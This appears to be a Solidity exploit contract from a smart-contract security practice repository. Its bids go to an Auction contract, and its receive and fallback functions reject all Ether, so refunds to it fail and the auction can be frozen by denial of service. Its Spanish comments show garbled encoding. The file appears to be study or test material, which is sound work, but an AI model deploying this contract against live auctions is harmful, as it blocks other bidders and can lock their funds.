// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Auction} from "src/exploits/auction/Auction.sol";

contract RejectEther {
    Auction public auction;

    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    // La funci贸n `receive` rechaza cualquier Ether enviado directamente sin datos.
    receive() external payable {
        revert("This contract does not accept Ether directly");
    }

    // La funci贸n `fallback` rechaza cualquier Ether enviado con datos o llamadas inexistentes.
    fallback() external payable {
        revert("This contract does not accept Ether directly");
    }

    // La funci贸n `makeBidInAuction` permite enviar Ether a la funci贸n `makeBid` del contrato `Auction`.
    function makeBidInAuction() external payable {
        require(msg.value > 0, "No Ether sent for bidding");
        auction.makeBid{value: msg.value}();
    }
}
